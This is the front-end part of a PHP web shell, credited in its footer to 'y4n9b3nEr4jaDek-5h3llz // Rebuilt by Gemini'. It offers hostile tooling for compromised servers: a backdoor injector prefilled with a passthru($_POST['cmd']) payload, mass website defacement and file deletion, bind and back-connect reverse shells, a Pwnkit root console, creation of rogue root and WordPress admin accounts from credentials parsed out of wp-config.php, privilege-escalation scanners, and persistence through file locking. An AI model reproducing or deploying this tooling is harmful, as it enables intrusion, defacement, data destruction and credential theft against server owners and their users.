    <div class="table-responsive"><table class="table table-hover table-sm align-middle"><thead class="table-dark"><tr><th style="width:2%"><input type="checkbox" id="selectAll"></th><th>Name</th><th class="text-center">Size</th><th class="text-center">Modified</th><th class="text-center">Owner/Group</th><th class="text-center">Perms</th><th class="text-center">Actions <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button></th></tr></thead><tbody><tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($path));?>">..</a></td><td colspan="5"></td></tr><?php foreach($dirs as $dir):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($dir);?>"></td><td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($path.htmlspecialchars($dir));?>"><?php echo htmlspecialchars($dir);?></a></td><td class="text-center">-</td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$dir));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$dir))['name']:@fileowner($path.$dir)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$dir))['name']:@filegroup($path.$dir));?></td><td class="text-center"><?php echo w($path.$dir,p($path.$dir));?></td><td class="text-center"><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($dir);?>')"><i class="bi bi-pencil-fill"></i></button></td></tr><?php endforeach;?><?php foreach($files as $file):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($file);?>"></td><td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="viewItem('<?php echo htmlspecialchars($file);?>')"><?php echo htmlspecialchars($file);?></a></td><td class="text-center"><?php echo sz(@filesize($path.$file));?></td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($path.$file));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($path.$file))['name']:@fileowner($path.$file)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($path.$file))['name']:@filegroup($path.$file));?></td><td class="text-center"><?php echo w($path.$file,p($path.$file));?></td><td class="text-center"><div class="btn-group"><button class="btn btn-sm btn-outline-info" onclick="editItem('<?php echo htmlspecialchars($file);?>')"><i class="bi bi-pencil-square"></i></button><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($file);?>')"><i class="bi bi-pencil-fill"></i></button><a href="?action=download&path=<?php echo urlencode($path);?>&file=<?php echo htmlspecialchars($file);?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a></div></td></tr><?php endforeach;?></tbody></table></div>
    <footer class="text-center text-white-50 mt-4">&copy; 2022-<?php echo date('Y');?> y4n9b3nEr4jaDek-5h3llz // Rebuilt by Gemini</footer>
</div>
<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>
<div class="modal fade" id="uploadModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-upload"></i> Upload Files</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form method="POST" enctype="multipart/form-data"><input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>"><div class="mb-3"><label for="files" class="form-label">Files will be uploaded to the current directory.</label><input class="form-control" type="file" name="files[]" multiple required></div><button type="submit" class="btn btn-main w-100">Upload</button></form></div></div></div></div>
<div class="modal fade" id="createFileModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Create New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFileForm"><div class="mb-3"><label for="newFileName" class="form-label">Filename:</label><input type="text" class="form-control" id="newFileName" placeholder="newfile.txt" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="createFolderModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-folder-plus"></i> Create New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFolderForm"><div class="mb-3"><label for="newFolderName" class="form-label">Folder Name:</label><input type="text" class="form-control" id="newFolderName" placeholder="new_folder" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="injectModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug-fill"></i> Backdoor Injector</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="injectForm"><div class="mb-3"><label for="targetFile" class="form-label">Target PHP File:</label><select class="form-select" id="targetFile" name="file" required><option value="" selected disabled>-- Select a writable PHP file --</option><?php foreach ($files as $file) { if (pathinfo($file, PATHINFO_EXTENSION) == 'php' && is_writable($path . $file)) { echo '<option value="' . htmlspecialchars($file) . '">' . htmlspecialchars($file) . '</option>'; } } ?></select></div><div class="mb-3"><label for="backdoorCode" class="form-label">Backdoor Code to Prepend:</label><textarea class="form-control" id="backdoorCode" name="code" rows="4" required><?php echo htmlspecialchars('<?php if(isset($_POST["cmd"])) { echo "<pre>"; passthru($_POST["cmd"]); echo "</pre>"; } ?>'); ?></textarea></div><button type="submit" class="btn btn-danger w-100">Inject Backdoor</button></form></div></div></div></div>
<div class="modal fade" id="editorModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="editorFileName"></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div id="editorContainer" style="position: relative;">
                    <textarea id="editorContent" class="form-control" style="height: 60vh; font-family: 'Roboto Mono'; display: none;"></textarea>
                    <pre class="language-none output-console" id="viewerContent" style="height: 60vh;"></pre>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-main" id="saveFileBtn" style="display: none;">Save Changes</button>
            </div>
        </div>
    </div>
</div>
<div class="modal fade" id="massDefaceModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Mass Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massOutput" class="output-console mb-3 d-none"></div><p>Mass Deface</p><form id="massDefaceForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><div class="mb-2"><textarea class="form-control" rows="3" name="script" placeholder="Hacked" required></textarea></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked><label class="form-check-label" for="onedir">One Dir</label></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="mass" value="mass"><label class="form-check-label" for="mass">Recursive</label></div><button type="submit" class="btn btn-main w-100 mt-2">Start Deface</button></form><hr><p class="mt-3">Mass Delete</p><form id="massDeleteForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><button type="submit" class="btn btn-danger w-100 mt-2">Start Deleting</button></form></div></div></div></div>
<div class="modal fade" id="networkModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Network Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="networkOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-tab" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-bind">Bind Port</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-back">Back-Connect</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-bind"><form class="network-form"><h6>Bind Port to /bin/sh [Perl]</h6><div class="input-group"><input class="form-control" type="text" name="port" placeholder="6969" required><button class="btn btn-main" type="submit" name="bpl">Execute</button></div></form></div><div class="tab-pane fade" id="nav-back"><form class="network-form"><h6>Back-Connect</h6><div class="mb-2"><label class="form-label">Server IP:</label><input class="form-control" type="text" name="server" value="<?php echo ia(); ?>" required></div><div class="mb-2"><label class="form-label">Port:</label><input class="form-control" type="text" name="port" placeholder="6969" required></div><div class="input-group"><select class="form-select" name="bc"><option value="perl">Perl</option><option value="python">Python</option></select><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div></div></div>
<div class="modal fade" id="rootConsoleModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-terminal-plus"></i> Root Console</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="pwnkitStatus" class="alert alert-secondary">Checking Pwnkit status...</div><div id="rootCmdOutput" class="output-console mb-3"># Output will appear here...</div><form id="rootCmdForm"><div class="input-group"><span class="input-group-text" id="promptIndicator">#</span><input type="text" class="form-control" id="rootCmdInput" placeholder="id" required><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div>
<div class="modal fade" id="securityModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-shield-lock"></i> Security Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="securityOutput" class="output-console mb-3 d-none"></div><h6 class="text-white-50">Backdoor Destroyer</h6><p><small>This will overwrite the <code>.htaccess</code> file in the document root to block access to all PHP files except this shell and common CMS files. Use with caution.</small></p><button class="btn btn-danger w-100 mb-4" id="destroyerBtn">Activate Backdoor Destroyer</button><hr><h6 class="text-white-50">Lock File / Shell</h6><p><small>Creates a background process to ensure a file remains locked (read-only) and is restored if deleted.</small></p><form id="lockItemForm"><div class="input-group"><input type="text" class="form-control" name="file_to_lock" placeholder="filename.php (in current dir)" required><button class="btn btn-main" type="submit">Lock Item</button></div></form></div></div></div></div>
<div class="modal fade" id="usersModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-people-fill"></i> User Management</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="usersOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-user-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-root-user">Root User</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-wp-user">WordPress User</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-root-user"><p><small>Add a new root user to the system. Requires a vulnerable server (check with Root Console).</small></p><form id="addRootUserForm"><div class="mb-2"><label class="form-label">Username</label><input type="text" name="username" class="form-control" required></div><div class="mb-2"><label class="form-label">Password</label><input type="text" name="password" class="form-control" required></div><button type="submit" class="btn btn-main w-100">Add Root User</button></form></div><div class="tab-pane fade" id="nav-wp-user"><p><small>Add a new administrator user to a WordPress installation.</small></p><form id="addWpUserForm"><div class="input-group mb-2"><input type="text" class="form-control" id="wpConfigPath" placeholder="Auto-detect or enter path to wp-config.php"><button class="btn btn-outline-secondary" type="button" id="parseWpConfigBtn">Parse</button></div><div class="row"><div class="col-md-6 mb-2"><input type="text" id="db_host" name="db_host" class="form-control" placeholder="DB Host" required></div><div class="col-md-6 mb-2"><input type="text" id="db_name" name="db_name" class="form-control" placeholder="DB Name" required></div><div class="col-md-6 mb-2"><input type="text" id="db_user" name="db_user" class="form-control" placeholder="DB User" required></div><div class="col-md-6 mb-2"><input type="text" id="db_pass" name="db_pass" class="form-control" placeholder="DB Password"></div><hr class="my-2"><div class="col-md-6 mb-2"><input type="text" name="wp_user" class="form-control" placeholder="New WP Username" required></div><div class="col-md-6 mb-2"><input type="text" name="wp_pass" class="form-control" placeholder="New WP Password" required></div></div><button type="submit" class="btn btn-main w-100 mt-2">Add WordPress Admin</button></form></div></div></div></div></div></div>
<div class="modal fade" id="scanRootModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug"></i> Root & SUID Scanner / Exploit Suggester</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><nav><div class="nav nav-tabs" id="nav-scan-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-autoscan">Auto Root Scan</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-suidscan">Scan SUID</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-exploitsuggester">Exploit Suggester</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-autoscan"><p><small>Attempts to run known local privilege escalation exploits to check for vulnerabilities.</small></p><button class="btn btn-main w-100 mb-3" id="startAutoScanBtn">Start Auto Scan</button><div id="autoScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-suidscan"><p><small>Scans for files with SUID (Set User ID) bit set, which can sometimes be exploited for privilege escalation.</small></p><button class="btn btn-main w-100 mb-3" id="startSuidScanBtn">Start SUID Scan</button><div id="suidScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-exploitsuggester"><p><small>Downloads and runs the Linux Exploit Suggester script to find potential exploits based on kernel version and installed software.</small></p><button class="btn btn-main w-100 mb-3" id="startExploitSuggesterBtn">Start Exploit Suggester</button><div id="exploitSuggesterOutput" class="output-console mb-3 d-none"></div></div></div></div></div></div></div>
<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-perl.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = '<?php echo htmlspecialchars($path, ENT_QUOTES); ?>';
    const scriptUrl = '<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES); ?>';
    let isPwnkitVulnerable = false;

    function showToast(message, type = 'success') {
        const toastId = 'toast-' + Date.now();
        const toastHTML = `<div id="${toastId}" class="toast align-items-center text-bg-${type} border-0" role="alert" aria-live="assertive" aria-atomic="true"><div class="d-flex"><div class="toast-body">${message}</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div></div>`;
        document.getElementById('toast-container').insertAdjacentHTML('beforeend', toastHTML);
        const toastEl = document.getElementById(toastId);
        if(bootstrap && bootstrap.Toast) {
            new bootstrap.Toast(toastEl).show();
        }
    }

    <?php if(isset($_SESSION['flash_message'])): ?>
        showToast('<?php echo addslashes($_SESSION['flash_message']); ?>');
        <?php unset($_SESSION['flash_message']); ?>
    <?php endif; ?>

    function ajaxRequest(data, successCallback) {
        fetch(`${scriptUrl}?ajax=true&path=${encodeURIComponent(currentPath)}`, { method: 'POST', body: data })
        .then(response => {
            if (!response.ok) {
                return response.text().then(text => {
                    throw new Error(`Server error: ${response.status} ${response.statusText}\n${text}`);
                });
            }
            return response.json().catch(error => {
                return response.text().then(text => {
                    throw new Error(`JSON parse error. Raw response:\n${text}`);
                });
            });
        })
        .then(successCallback)
        .catch(error => {
            console.error('AJAX Request Error:', error);
            showToast(`Error: ${error.message}`, 'danger');
        });
    }

    const modals = {};
    const modalIds = ['uploadModal', 'createFileModal', 'createFolderModal', 'injectModal', 'editorModal', 'massDefaceModal', 'networkModal', 'rootConsoleModal', 'securityModal', 'usersModal', 'scanRootModal'];
    modalIds.forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            modals[id] = new bootstrap.Modal(el);
        }
    });

    function attachClickListener(buttonId, modalId) {
        const button = document.getElementById(buttonId);
        if (button && modals[modalId]) {
            button.addEventListener('click', () => modals[modalId].show());
        }
    }
    
    attachClickListener('btnUpload', 'uploadModal');
    attachClickListener('btnNewFile', 'createFileModal');
    attachClickListener('btnNewFolder', 'createFolderModal');
    attachClickListener('btnNetwork', 'networkModal');
    attachClickListener('btnInjector', 'injectModal');
    attachClickListener('btnMassTools', 'massDefaceModal');
    attachClickListener('btnRootConsole', 'rootConsoleModal');
    attachClickListener('btnUsers', 'usersModal');
    attachClickListener('btnSecurity', 'securityModal');
    attachClickListener('btnScanRoot', 'scanRootModal');

    const selectAllCheckbox = document.getElementById('selectAll');
    if (selectAllCheckbox) {
        selectAllCheckbox.addEventListener('change', e => document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked));
    }

    document.querySelectorAll('.file-checkbox').forEach(cb => cb.addEventListener('change', () => document.getElementById('deleteSelectedBtn').classList.toggle('d-none', !document.querySelector('.file-checkbox:checked'))));
    
    const deleteSelectedBtn = document.getElementById('deleteSelectedBtn');
    if(deleteSelectedBtn) {
        deleteSelectedBtn.addEventListener('click', () => {
            const files = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
            if(confirm(`Delete ${files.length} item(s)?`)) {
                const fd = new FormData(); fd.append('action', 'delete_multiple'); files.forEach(f => fd.append('files[]', f));
                ajaxRequest(fd, d => { showToast(`Deleted ${d.success.length}. Failed: ${d.errors.length}.`); if(d.success.length) setTimeout(()=>location.reload(),1e3);});
            }
        });
    }

    const createFileForm = document.getElementById('createFileForm');
    if(createFileForm) {
        createFileForm.addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_file'); fd.append('name',document.getElementById('newFileName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFileModal.hide(); setTimeout(()=>location.reload(),1e3);}});});
    }

    const createFolderForm = document.getElementById('createFolderForm');
    if(createFolderForm) {
        createFolderForm.addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_folder'); fd.append('name',document.getElementById('newFolderName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFolderModal.hide(); setTimeout(()=>location.reload(),1e3);}});});
    }

    window.renameItem=item=>{const n=prompt(`New name for "${item}":`,item);if(n&&n!==item){const fd=new FormData();fd.append('action','rename');fd.append('old',item);fd.append('new',n);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});}};
    
    let currentEditingFile='';
    const editorContent = document.getElementById('editorContent');
    const viewerContent = document.getElementById('viewerContent');
    const editorFileName = document.getElementById('editorFileName');
    const saveFileBtn = document.getElementById('saveFileBtn');

    function getLanguageClass(filename) {
        const ext = filename.split('.').pop().toLowerCase();
        switch (ext) {
            case 'php': return 'language-php';
            case 'js': return 'language-javascript';
            case 'html': case 'htm': return 'language-html';
            case 'css': return 'language-css';
            case 'py': return 'language-python';
            case 'pl': return 'language-perl';
            case 'sh': return 'language-bash';
            case 'json': return 'language-json';
            case 'xml': return 'language-xml';
            case 'sql': return 'language-sql';
            case 'txt': return 'language-plain';
            default: return 'language-none';
        }
    }

    window.viewItem = file => editItem(file, true);

    window.editItem = (file, readOnly = false) => {
        currentEditingFile = file;
        editorFileName.textContent = (readOnly ? 'Viewing: ' : 'Editing: ') + file;

        if (readOnly) {
            editorContent.style.display = 'none';
            viewerContent.style.display = 'block';
            saveFileBtn.style.display = 'none';
            viewerContent.innerHTML = 'Loading...';
        } else {
            editorContent.style.display = 'block';
            viewerContent.style.display = 'none';
            saveFileBtn.style.display = 'block';
            editorContent.value = 'Loading...';
        }

        const fd = new FormData();
        fd.append('action', 'get_content');
        fd.append('file', file);
        ajaxRequest(fd, d => {
            if (d.status === 'ok') {
                if (readOnly) {
                    viewerContent.innerHTML = `<code class="${getLanguageClass(file)}">${escapeHtml(d.content)}</code>`;
                    Prism.highlightElement(viewerContent.querySelector('code'));
                } else {
                    editorContent.value = d.content;
                }
            } else {
                if (readOnly) {
                    viewerContent.textContent = d.message;
                } else {
                    editorContent.value = d.message;
                }
            }
            modals.editorModal.show();
        });
    };
    
    if(saveFileBtn) {
        saveFileBtn.addEventListener('click',()=>{const fd=new FormData();fd.append('action','save_content');fd.append('file',currentEditingFile);fd.append('content',editorContent.value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')modals.editorModal.hide();});});
    }

    function escapeHtml(text) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }

    const injectForm = document.getElementById('injectForm');
    if(injectForm) {
        injectForm.addEventListener('submit',e=>{e.preventDefault();if(confirm('Inject this backdoor?')){const fd=new FormData(e.target);fd.append('action','inject_backdoor');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')modals.injectModal.hide();});}});
    }

    document.querySelectorAll('.network-form').forEach(f=>f.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('networkOutput');o.innerHTML='Executing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','network');ajaxRequest(fd,d=>o.innerText=d.output);}));
    
    const massDefaceForm = document.getElementById('massDefaceForm');
    if(massDefaceForm) {
        massDefaceForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_deface');ajaxRequest(fd,d=>o.innerText=d.output);});
    }

    const massDeleteForm = document.getElementById('massDeleteForm');
    if(massDeleteForm) {
        massDeleteForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_delete');ajaxRequest(fd,d=>o.innerText=d.output);});
    }
    
    const rootConsoleModalEl = document.getElementById('rootConsoleModal');
    if(rootConsoleModalEl) {
        rootConsoleModalEl.addEventListener('shown.bs.modal', () => { const statusEl = document.getElementById('pwnkitStatus'); const promptEl = document.getElementById('promptIndicator'); const fd = new FormData(); fd.append('action', 'check_pwnkit_status'); ajaxRequest(fd, data => { isPwnkitVulnerable = data.vulnerable; statusEl.textContent = data.message; statusEl.className = `alert ${isPwnkitVulnerable ? 'alert-success' : 'alert-danger'}`; promptEl.textContent = isPwnkitVulnerable ? '#' : '$'; }); });
    }

    const rootCmdForm = document.getElementById('rootCmdForm');
    if(rootCmdForm) {
        rootCmdForm.addEventListener('submit', e => { e.preventDefault(); const cmdInput = document.getElementById('rootCmdInput'); const cmdOutput = document.getElementById('rootCmdOutput'); const fd = new FormData(); fd.append('action', isPwnkitVulnerable ? 'root_cmd' : 'cmd'); fd.append('cmd', cmdInput.value); const prompt = isPwnkitVulnerable ? '#' : '$'; cmdOutput.innerHTML += `\n<span style="color:var(--primary-accent);">${prompt} ${cmdInput.value}</span>\n`; ajaxRequest(fd, data => { cmdOutput.innerHTML += data.output || 'Error'; cmdOutput.scrollTop = cmdOutput.scrollHeight; cmdInput.value = ''; }); });
    }
    
    const destroyerBtn = document.getElementById('destroyerBtn');
    if(destroyerBtn) {
        destroyerBtn.addEventListener('click',e=>{e.preventDefault();if(confirm('ARE YOU SURE? This will overwrite the .htaccess file.')){const o=document.getElementById('securityOutput');o.innerText='Activating...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','backdoor_destroyer');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});}});
    }

    const lockItemForm = document.getElementById('lockItemForm');
    if(lockItemForm) {
        lockItemForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('securityOutput');o.innerText='Locking item...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','lock_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});});
    }
    
    const addRootUserForm = document.getElementById('addRootUserForm');
    if(addRootUserForm) {
        addRootUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add root user...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_root_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    }

    const addWpUserForm = document.getElementById('addWpUserForm');
    if(addWpUserForm) {
        addWpUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add WordPress admin...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_wp_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
    }

    const parseWpConfigBtn = document.getElementById('parseWpConfigBtn');
    if(parseWpConfigBtn) {
        parseWpConfigBtn.addEventListener('click', e => { e.preventDefault(); const o = document.getElementById('usersOutput'); o.innerText = 'Searching for wp-config.php...'; o.classList.remove('d-none'); const fd = new FormData(); fd.append('action', 'parse_wp_config'); const manualPath = document.getElementById('wpConfigPath').value; if(manualPath) fd.append('config_path', manualPath); ajaxRequest(fd, d => { if(d.status === 'ok') { o.innerText = 'Successfully parsed credentials from: ' .concat(d.path); document.getElementById('db_host').value = d.creds.db_host || ''; document.getElementById('db_name').value = d.creds.db_name || ''; document.getElementById('db_user').value = d.creds.db_user || ''; document.getElementById('db_pass').value = d.creds.db_password || ''; } else { o.innerText = d.message; } }); });
    }

    const startAutoScanBtn = document.getElementById('startAutoScanBtn');
    if(startAutoScanBtn) {
        startAutoScanBtn.addEventListener('click', () => {
            const outputEl = document.getElementById('autoScanOutput');
            outputEl.innerHTML = 'Starting auto root scan...<br>This may take a moment.';
            outputEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', 'scan_root');
            ajaxRequest(fd, d => {
                outputEl.innerHTML = `<pre><code class="language-bash">${escapeHtml(d.output || d.message)}</code></pre>`;
                Prism.highlightElement(outputEl.querySelector('code'));
                outputEl.scrollTop = outputEl.scrollHeight;
            });
        });
    }

    const startSuidScanBtn = document.getElementById('startSuidScanBtn');
    if(startSuidScanBtn) {
        startSuidScanBtn.addEventListener('click', () => {
            const outputEl = document.getElementById('suidScanOutput');
            outputEl.innerHTML = 'Scanning for SUID files...<br>This may take a moment.';
            outputEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', 'scan_suid');
            ajaxRequest(fd, d => {
                outputEl.innerHTML = `<pre><code class="language-bash">${escapeHtml(d.output || d.message)}</code></pre>`;
                Prism.highlightElement(outputEl.querySelector('code'));
                outputEl.scrollTop = outputEl.scrollHeight;
            });
        });
    }

    const startExploitSuggesterBtn = document.getElementById('startExploitSuggesterBtn');
    if(startExploitSuggesterBtn) {
        startExploitSuggesterBtn.addEventListener('click', () => {
            const outputEl = document.getElementById('exploitSuggesterOutput');
            outputEl.innerHTML = 'Running exploit suggester...<br>This requires internet access and may take a while.';
            outputEl.classList.remove('d-none');
            const fd = new FormData();
            fd.append('action', 'exploit_suggester');
            ajaxRequest(fd, d => {
                outputEl.innerHTML = `<pre><code class="language-bash">${escapeHtml(d.output || d.message)}</code></pre>`;
                Prism.highlightElement(outputEl.querySelector('code'));
                outputEl.scrollTop = outputEl.scrollHeight;
            });
        });
    }
});
</script>
</body>
</html>
